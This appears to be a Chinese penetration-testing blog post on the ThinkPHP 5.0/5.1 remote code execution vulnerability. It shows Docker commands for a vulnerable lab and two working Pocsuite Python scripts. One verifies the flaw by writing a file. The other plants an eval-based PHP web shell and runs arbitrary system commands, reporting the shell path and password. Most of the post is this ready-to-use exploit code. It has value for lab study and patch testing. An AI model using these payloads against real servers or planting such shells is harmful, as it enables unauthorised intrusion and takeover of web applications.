---
title: Think Php 5.0,5.1 远程代码执行漏洞
category: 
- 渗透测试
tags: 
- Pocsuite
- Docker

---

### 漏洞概述

- 影响版本

`ThinkPHP < 5.0.23 ThinkPHP < 5.1.31`

### 漏洞环境搭建

- 拉取镜像到本地

```bash
$ docker pull medicean/vulapps:t_thinkphp_2
```

- 启动环境

```bash
$ docker run -d -p 80:80 medicean/vulapps:t_thinkphp_2
```

![image-20201126140037674](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201126140037674.png)

<!-- more -->

### 漏洞利用

- 访问 `http://你的 IP 地址:端口号/`

![image-20201126140306384](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201126140306384.png)

- Poc

```python
#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import urlparse
from pocsuite.api.request import req
from pocsuite.api.utils import randomStr


class TestPOC(POCBase):
    vulID = 'N/A'  # ssvid
    version = '1.0'
    author = ['co0ontty']
    vulDate = '2019-08-12'
    createDate = '2019-08-12'
    updateDate = '2019-08-12'
    references = ['https://blog.thinkphp.cn/869075']
    name = 'Thinkphp 5.0.22/5.1.29 远程命令执行漏洞'
    appPowerLink = 'http://www.thinkphp.cn'
    appName = 'Thinkphp'
    appVersion = '5.0.22/5.1.29'
    vulType = '命令执行'
    desc = ''' 
    由于框架对控制器名没有进行足够的检测，会导致在没有开启强制路由的情况下引发 getshell 漏洞。该漏洞影响 5.0.22/5.1.29 版本。
    '''
    samples = ['']
    install_requires = ['']

    def _verify(self):
        result = {}
        base_url = self.url
        if (urlparse.urlparse(base_url).port) is None:
            base_url = base_url+":8080"
        verify_str = randomStr(6)
        verify_filename = randomStr(3)
        vul_url = urlparse.urljoin(
            base_url, "index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]={}.php&vars[1][]=<?php echo '{}';?>".format(verify_filename, verify_str))
        create_verify_file = req.get(vul_url)
        verify_url = urlparse.urljoin(base_url, verify_filename+".php")
        get_verify_str = req.get(verify_url)
        if verify_str in get_verify_str.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)
    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
```

- exp

```python
#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import urlparse
from pocsuite.lib.core.enums import CUSTOM_LOGGING
from pocsuite.lib.core.data import logger
from pocsuite.api.request import req
from pocsuite.api.utils import randomStr


class TestPOC(POCBase):
    vulID = 'N/A'  # ssvid
    version = '1.0'
    author = ['co0ontty']
    vulDate = '2019-08-12'
    createDate = '2019-08-12'
    updateDate = '2019-08-12'
    references = ['https://blog.thinkphp.cn/869075']
    name = 'Thinkphp 5.0.22/5.1.29 远程命令执行漏洞'
    appPowerLink = 'http://www.thinkphp.cn'
    appName = 'Thinkphp'
    appVersion = '5.0 - 5.1'
    vulType = '命令执行'
    desc = ''' 
    由于框架对控制器名没有进行足够的检测，会导致在没有开启强制路由的情况下引发getshell漏洞。该漏洞影响 5.0.22/5.1.29 版本。
    '''
    samples = ['']
    install_requires = ['']

    def _verify(self):
        result = {}
        base_url = self.url
        if (urlparse.urlparse(base_url).port) is None:
            base_url = base_url+":80"
        if 'cmd' not in self.params:
            logger.log(CUSTOM_LOGGING.SYSINFO,
                       "You can use --extra-params=\"{'cmd':'whoami'}\" to exec command")
            cmd = 'whoami'
        else:
            cmd = self.params['cmd']
        verify_str = randomStr(6)
        verify_filename = randomStr(3)
        random_shell_pass = randomStr(8)
        upload_url = urlparse.urljoin(
            base_url, "index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]={}.php&vars[1][]=<?php @eval($_POST[{}]);echo'{}';?>".format(verify_filename, random_shell_pass, verify_str))
        cmd_url = urlparse.urljoin(
            base_url, "index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={}".format(cmd))
        create_verify_file = req.get(upload_url)
        cmd_response_text = req.get(cmd_url).text
        verify_url = urlparse.urljoin(base_url, verify_filename+".php")
        get_verify_str = req.get(verify_url)
        if verify_str in get_verify_str.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['shellpath'] = verify_url
            result['VerifyInfo']['shellpass'] = random_shell_pass
            result['VerifyInfo']['cmdresult'] = cmd_response_text
        return self.parse_output(result)
    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
```

- 利用过程

本教程使用pocsuite3 平台进行漏洞验证：

![image-20201126141228867](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201126141228867.png)

相关代码如下：

```bash
poc-console 
search Thinkphp
use 1
set target 192.168.184.129
set lport 80
run
```

### 参考链接

[references](https://blog.thinkphp.cn/869075)